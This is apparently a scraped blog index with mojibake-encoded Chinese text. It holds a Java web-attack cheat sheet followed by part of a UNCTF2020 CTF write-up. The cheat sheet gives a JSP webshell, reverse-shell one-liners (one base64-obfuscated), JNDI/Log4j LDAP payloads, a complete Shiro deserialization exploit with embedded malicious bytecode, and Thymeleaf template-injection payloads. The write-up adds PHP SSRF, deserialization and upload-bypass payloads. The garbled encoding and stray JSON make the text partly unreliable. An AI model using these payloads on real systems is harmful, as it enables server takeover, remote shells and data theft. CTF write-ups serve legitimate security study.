æ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚ /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ /WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼Œå¦‚ /WEB-INF/classes/com/wm/ctf/FlagController.class /WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶ /WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ /WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ JSPä¸€å¥è¯1234567891011121314151617&lt;% String command = request.getParameter(&quot;cmd&quot;); if(command != null) &#123; java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1) &#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125; else &#123; out.print(&quot;format: xxx.jsp?cmd=Command&quot;); &#125;%&gt; åå¼¹shell12345678910111213// å‘½ä»¤æ‰§è¡ŒåŸºæœ¬ä»£ç Runtime r = Runtime.getRuntime();Process p = r.exec(...);p.waitFor();// å¤šå‚æ•°Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#125;);// å•å‚æ•°Process p = r.exec(&quot;bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/ip/port&lt;&amp;1&quot;);Process p = r.exec(&quot;bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;);Process p = r.exec(&quot;bash -c $*|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;);Process p = r.exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); â€‹ ç»•è¿‡filteræƒé™å¸¸è§çš„å®ç°æ–¹å¼ï¼Œåœ¨ä¸è°ƒç”¨Spring Securityã€Shiroç­‰æƒé™æ§åˆ¶ç»„ä»¶çš„æƒ…å†µä¸‹ï¼Œä¼šä½¿ç”¨Filterè·å–è¯·æ±‚è·¯å¾„ï¼Œè¿›è¡Œæ ¡éªŒã€‚ ../ï¼š/system/login/../../login/main.do URLæˆªæ–­ï¼š/login/main.do;123 å¤š /ï¼š//system/main.do URLç¼–ç ï¼š/system/%55%73%65%72%49%6e%66%6f%53%65%61%72%63%68%2e%64%6f å‚è€ƒï¼š Javaå®‰å…¨ä¹‹Filteræƒé™ç»•è¿‡ fastjsonå‚è€ƒï¼š https://github.com/safe6Sec/Fastjson fastjsonå°äº1.2.68å…¨æ¼æ´RCEåˆ©ç”¨exp â€‹ JNDIæ³¨å…¥JNDIExp åœ¨VPSä¸Šå¯åŠ¨å·¥å…·,åˆ©ç”¨æ—¶è®²ipæ›¿æ¢ä¸ºå®é™…VPSçš„IPåœ°å€ã€‚ $&#123;jndi:ldap://127.0.0.1:1389/basic/$&#123;java:version&#125;&#125; ä½¿ç”¨ $&#123;java:version&#125; è·å–åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„javaç‰ˆæœ¬ï¼ˆä»…ä»…é€‚ç”¨äºLog4j2æ¼æ´åˆ©ç”¨ï¼Œfastjsonç­‰å…¶ä»–æ¼æ´å¯ä»¥è·³è¿‡æ­¤æ­¥éª¤ï¼‰ JDKç‰ˆæœ¬å°äº11.0.1, 8u191, 7u201, 6u211ç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨basicæ¨¡å— 12345ldap://0.0.0.0:1389/basic/cmd (æ— å›æ˜¾ï¼Œéœ€è¦è¿›è¡Œurlç¼–ç )ldap://0.0.0.0:1389/basic/base64/[base64_encoded_cmd]ldap://0.0.0.0:1389/basic/ReverseShell/[ip]/[port](åå¼¹shell)ldap://0.0.0.0:1389/basic/ReverseShell2/[ip]/[port]ldap://0.0.0.0:1389/basic/memshell/[memshellType]ï¼ˆå†…å­˜é©¬ï¼‰ JDKç‰ˆæœ¬å¤§äº11.0.1, 8u191, 7u201, 6u211æ—¶ï¼Œéœ€è¦å°è¯•ä½¿ç”¨åˆ©ç”¨é“¾ç»•è¿‡ï¼Œå¯ä»¥ä½¿ç”¨$&#123;jndi:ldap://127.0.0.1:1389/fuzzbyDNS/[domain]&#125; åˆ©ç”¨dnslogå»åˆ¤æ–­å“ªäº›åˆ©ç”¨é“¾å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼ˆåªéœ€è¦å‘é€ä¸€æ¬¡è¯·æ±‚ï¼‰ ï¼ˆååºåˆ—åŒ–é“¾å­˜åœ¨ç‰ˆæœ¬åŒºåˆ«serialVersionUIDä¼šæ”¹å˜ï¼Œé€šè¿‡dnsè¯·æ±‚å¯çŸ¥ç›®æ ‡å¯ä»¥ä½¿ç”¨elã€groovyã€BeanShell1ååºåˆ—åŒ–ã€CC3.2.1ååºåˆ—åŒ–ã€CB192ç­‰ç­‰åˆ©ç”¨æ¨¡å—ï¼‰ é€‰æ‹©å…¶ä¸­ä¸€ä¸ªåˆ©ç”¨é“¾è¿›è¡Œåˆ©ç”¨ã€‚ â€‹ Shiro æœªæˆæƒè®¿é—® &lt;1.5.2 Shiroæ¡†æ¶é€šè¿‡æ‹¦æˆªå™¨åŠŸèƒ½æ¥å¯¹ç”¨æˆ·è®¿é—®æƒé™è¿›è¡Œæ§åˆ¶ï¼Œå¦‚anon, authcç­‰æ‹¦æˆªå™¨ã€‚anonä¸ºåŒ¿åæ‹¦æˆªå™¨ï¼Œä¸éœ€è¦ç™»å½•å³å¯è®¿é—®ï¼›authcä¸ºç™»å½•æ‹¦æˆªå™¨ï¼Œéœ€è¦ç™»å½•æ‰å¯ä»¥è®¿é—®ã€‚ /;/admin æˆ– /xxx/...;/admin /;/actuator/heapdump ä¸‹è½½dumpï¼Œä½¿ç”¨visualvmåˆ†æï¼Œå¾—åˆ°shiroçš„åŠ å¯†å¯†é’¥ ååºåˆ—åŒ– é€šç”¨ æ‰“cb1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;public class CommonsBeanutilsShiro &#123; public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123; Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception &#123;// TemplatesImpl obj = new TemplatesImpl();// setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;// ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()// &#125;);// setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);// setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); byte[] evilcode = Base64.getDecoder().decode(&quot;yv66vgAAADQAuQoALwBfCgBgAGEKAGAAYggAYwoAZABlCABmBwBnCgAHAGgHAGkKAGoAawgAbAgAbQgAbggAbwgATQoABwBwCABxCABOBwByCgBqAHMIAFAIAHQKAHUAdgoAEwB3CAB4CgATAHkIAHoIAHsKABMAfAgAfQgAfggAfwgAgAoACQCBCACCBwCDCgCEAIUKAIQAhgoAhwCICgAkAIkIAIoKACQAiwoAJACMCACNCACOBwCPBwCQAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMcm9tZS9TcHJpbmdFdmlsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwCRAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAFjAQARTGphdmEvbGFuZy9DbGFzczsBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFvAQASTGphdmEvbGFuZy9PYmplY3Q7AQACbTEBAARyZXNwAQADcmVxAQAJZ2V0V3JpdGVyAQAJZ2V0SGVhZGVyAQAGd3JpdGVyAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY29tbWFuZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQALY2hhcnNldE5hbWUBAA1TdGFja01hcFRhYmxlBwCPBwBnBwCSBwBpBwByBwBTBwCTAQAKU291cmNlRmlsZQEAD1NwcmluZ0V2aWwuamF2YQwAQgBDBwCUDACVAJYMAJcAmAEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAmQwAmgCbAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAJwAnQEAEGphdmEvbGFuZy9PYmplY3QHAJIMAJ4AnwEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEACmdldFJlcXVlc3QBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQwAoACdAQAlamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVxdWVzdAEAEGphdmEvbGFuZy9TdHJpbmcMAKEAogEAB29zLm5hbWUHAKMMAKQApQwApgCnAQAGd2luZG93DACoAKkBAANHQksBAAVVVEYtOAwAqgCnAQADV0lOAQACL2MBAAcvYmluL3NoAQACLWMMAKsArAEAB3ByaW50bG4BABFqYXZhL3V0aWwvU2Nhbm5lcgcArQwArgCvDACwALEHALIMALMAtAwAQgC1AQACXEEMALYAtwwAuACnAQAFZmx1c2gBAAVjbG9zZQEAD3JvbWUvU3ByaW5nRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAWADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAbADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAHAAEAB0AEAAeABsAHwAlACAAMQAhADwAIgBIACMAUwAkAF8AJQB1ACYAkAAnAJYAKACcACkAqQAqAL4AKwDEACwA3QAtAO0ALgDzAC8A/AAxAQIAMgEIADQBDgA1AUoANgFiADcBegA4ADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXg==&quot;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;evilcode&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); byte[] expcode = Base64.getEncoder().encode(barr.toByteArray()); System.out.println(new String(expcode)); &#125;&#125; &lt;=1.2.4 æ£€æµ‹å·¥å…·ï¼š https://github.com/sv3nbeast/ShiroScan https://github.com/feihong-cs/ShiroExploit-Deprecated/releases â€‹ Springboot actuatorSpringboot actuatoré…ç½®ä¸å½“å¯¼è‡´APIå®‰å…¨é—®é¢˜ã€‚ APIæ‰«æå·¥å…·ï¼šAPIKit 1234567891011121314/actuator/autoconfig åº”ç”¨çš„è‡ªåŠ¨åŒ–é…ç½®æŠ¥å‘Š/actuator/heapdump åº”ç”¨å®æ—¶çš„JVMå †ä¿¡æ¯ï¼ˆç»“åˆJDumpSpiderè·å–å†…å®¹ï¼‰/actuator/beans åº”ç”¨ä¸Šä¸‹æ–‡åˆ›å»ºçš„æ‰€æœ‰ Bean/actuator/configprops åº”ç”¨ä¸­é…ç½®çš„å±æ€§ä¿¡æ¯æŠ¥å‘Š/actuator/env ç¯å¢ƒå±æ€§æŠ¥å‘Š/actuator/mappings SpringMVC çš„æ§åˆ¶å™¨æ˜ å°„å…³ç³»æŠ¥å‘Š/actuator/info è‡ªå®šä¹‰çš„é…ç½®ä¿¡æ¯/actuator/metrics å½“å‰åº”ç”¨çš„å„ç±»é‡è¦åº¦é‡æŒ‡æ ‡/actuator/health åº”ç”¨çš„å„ç±»å¥åº·æŒ‡æ ‡ä¿¡æ¯/actuator/threaddump ç”¨æ¥æš´éœ²ç¨‹åºè¿è¡Œä¸­çš„çº¿ç¨‹ä¿¡æ¯/actuator/httptrace æ˜¾ç¤ºHTTPè·Ÿè¸ªä¿¡æ¯ï¼ˆé»˜è®¤æ˜¾ç¤ºæœ€å100ä¸ªHTTPè¯·æ±‚ï¼‰/actuator/scheduledtasks è®¡åˆ’ä»»åŠ¡/actuator/jolokia JMX-HTTPæ¡¥æ¥å™¨ï¼ˆXXE-SSRFï¼‰ â€‹ ThymeleafThymeleafæ¨¡æ¿æ³¨å…¥ 123__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x__$&#123;T(java.lang.Thread).sleep(10000)&#125;__::... __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::... å‚è€ƒï¼š Javaå®‰å…¨ä¹‹Thymeleaf æ¨¡æ¿æ³¨å…¥åˆ†æ â€‹ Mybatismybatis çš„ SQL æ˜ å°„æ”¯æŒä½¿ç”¨ OGNL è¡¨è¾¾å¼ï¼Œ VoteProvider ç›´æ¥ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥æ¥ç”Ÿæˆ SQL è¯­å¥ï¼Œå¦‚æœé”™è¯¯åœ°æŠŠ ç”¨æˆ·è¾“å…¥æ‹¼æ¥è¿›å»ï¼Œä¸ä»…ä¼šå‘ç”Ÿ SQL æ³¨å…¥ï¼Œè¿˜ä¼šå¼•å‘ OGNL æ³¨å…¥ã€‚ è¡¨è¾¾å¼æ³¨å…¥RCEï¼š `/vote/getDetailedVoteById?vid=3) union select null,â€$","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"ç»•è¿‡","slug":"ç»•è¿‡","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"UNCTF2020","slug":"match-UNCTF2020","date":"2020-11-14T10:44:31.000Z","updated":"2020-11-30T09:06:09.861Z","comments":true,"path":"2020/11/14/match-UNCTF2020/","permalink":"https://lazzzaro.github.io/2020/11/14/match-UNCTF2020/","excerpt":"","text":"â€‹ 2020å¹´é«˜æ ¡è”åˆæ‹›æ–°èµ›UNCTF ç«èµ›æ—¶é—´ï¼š 2020å¹´11æœˆ07æ—¥-14æ—¥ åé¢å‡ å¤©æ²¡å¤ªçœ‹æ‰äº†ä¸‹æ¥ï¼ŒRank: 23 Webeasy_ssrf 123456789101112131415&lt;?phpecho&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;;highlight_file(__FILE__);$url = $_GET[&#x27;url&#x27;];if(preg_match(&#x27;/unctf\\.com/&#x27;,$url))&#123; if(!preg_match(&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;,$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo(&#x27;error!!&#x27;); &#125;&#125;else&#123; echo(&quot;error&quot;);&#125;?&gt; ç®€å•çš„ssrfæ”»å‡»ã€‚ file_get_contentså‡½æ•°ï¼Œå½“ç›®æ ‡è¯·æ±‚æ—¶ä¼šåˆ¤æ–­ä½¿ç”¨çš„åè®®ï¼Œå¦‚æœä¸ºæ— æ³•è¯†åˆ«çš„åè®®ä¼šå½“åšç›®å½•å¤„ç†ï¼Œä¼šé€ æˆç›®å½•ç©¿è¶Šï¼Œæ„é€ payload: ?url=0://unctf.com/../../../../../flagæ‹¿åˆ°flagã€‚ â€‹ easyunserialize 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ã€‚ å…ˆæ„é€ æ™®é€šæƒ…å½¢ï¼š 123456789101112131415161718192021222324252627&lt;?phpclass a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;$x=new a(&#x27;admin&#x27;,1);echo serialize($x);//O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:1;&#125;?&gt; éœ€è¦passwordå˜ä¸ºeasyï¼Œä¸”challengeä¼šå¤š4å­—èŠ‚å˜easychallengeï¼Œæ„é€  ?1=challenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; ä¼šå˜æˆ ?1=easychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; è®¡ç®—éœ€è¦çš„challengeæ•°é‡ï¼š$9x+29=(9+4)x$ï¼Œå‘ç° $x=7.25$ éæ•´æ•°ï¼Œ åœ¨payloadåè¡¥è¶³ä¸‰ä¸ªç©ºæ ¼ï¼Œä½¿å¾— $9x+29+3=(9+4)x$ï¼Œè§£å¾— $x=8$ï¼Œå³æ„é€ unameä¸º8ä¸ªchallengeå¹¶åœ¨å°¾éƒ¨è¡¥ä¸‰ä¸ªç©ºæ ¼ï¼Œpayloadï¼š ?1=challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;%20%20%20 â€‹ babyeval 123456789101112131415&lt;?php // flagåœ¨flag.php if(isset($_GET[&#x27;a&#x27;]))&#123; if(preg_match(&#x27;/\\(.*\\)/&#x27;, $_GET[&#x27;a&#x27;])) die(&#x27;hacker!!!&#x27;); ob_start(function($data)&#123; if (strpos($data, &#x27;flag&#x27;) !== false) return &#x27;ByeBye hacker&#x27;; return false; &#125;); eval($_GET[&#x27;a&#x27;]); &#125; else &#123; highlight_file(__FILE__); &#125;?&gt; è¿‡æ»¤ä¸å¤šçš„RCEï¼Œ?a=echo `base64 flag.php` â€‹ ezphp 123456789101112&lt;?phpshow_source(__FILE__);$username = &quot;admin&quot;;$password = &quot;password&quot;;include(&quot;flag.php&quot;);$data = isset($_POST[&#x27;data&#x27;])? $_POST[&#x27;data&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($data);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125; ååºåˆ—åŒ–ï¼Œè¦æ„é€ usernameä¸ºadminå’Œpasswordä¸ºpasswordï¼Œå°è¯•æ„é€ arrayï¼š 12345&lt;?php$x=array(&#x27;username&#x27;=&gt;&#x27;admin&#x27;,&#x27;password&#x27;=&gt;&#x27;password&#x27;);echo serialize($x);//a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;password&quot;;&#125;?&gt; å‘ç°ä¸æˆåŠŸï¼Œé‚£ä¹ˆusernameå’Œpasswordéœ€è¦çš„å®é™…å­—ç¬¦ä¸²åº”è¯¥ä¸å¯¹ã€‚ ifåˆ¤æ–­æ¡ä»¶å‡ºç”¨çš„æ˜¯==å¼±ç±»å‹æ¯”è¾ƒï¼ŒPHPä¸­ä»»æ„å­—ç¬¦ä¸²==trueç»“æœéƒ½ä¸ºtrueï¼Œæ›´æ¢æ„é€ å€¼ä¸ºboolç±»å‹ï¼š 12345&lt;?php$x=array(&#x27;username&#x27;=&gt;true,&#x27;password&#x27;=&gt;true);echo serialize($x);//a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;?&gt; POSTæäº¤payloadï¼Œå¾—åˆ°flagã€‚ â€‹ easy_upload éšä¾¿ä¸Šä¼  De1ctf 2020-Check inåŸé¢˜ã€‚ éšä¾¿ä¼ ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œå›æ˜¾è¿‡æ»¤perl|pyth|ph|auto|curl|base|\\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents! ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œbpæ”¹åŒ…ï¼Œç”¨æ¢è¡Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼š 12345AddHandler p\\hp5-script .txtp\\hp_value au\\to_append_file /flag å†éšä¾¿ä¼ ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œè®¿é—®å¯¹åº”è·¯å¾„å³åŠ è½½å¾—åˆ°/flagå†…å®¹ã€‚ â€‹ easyflaskè¿›å…¥æç¤ºa easy flask problem,first login as the adminï¼Œ è®¿é—®/loginç™»å½•ï¼Œå°è¯•admin/adminç™»å½•ï¼Œæç¤ºlogin fail! check /registerï¼Œ è®¿é—®/registeræ³¨å†Œï¼Œç”¨admin/adminæ³¨å†Œï¼Œæç¤ºregister successï¼Œæ³¨å†ŒæˆåŠŸï¼Œ å›åˆ°ç™»å½•é¡µç™»å½•ï¼Œæç¤ºadmin login success!ï¼Œ å†å›åˆ°ä¸»é¡µï¼Œå‘ç°æç¤ºå˜ä¸ºadmin login success and check the secret route /secret_route_you_do_not_know è®¿é—®/secret_route_you_do_not_knowï¼Œæç¤ºyou should &#39;guess&#39; the secret number GETæ–¹å¼ä¼ å…¥?guess=&#123;&#123;3*5&#125;&#125;ï¼Œå›æ˜¾15 error!!ï¼Œå­˜åœ¨SSTIæ¼æ´ã€‚ 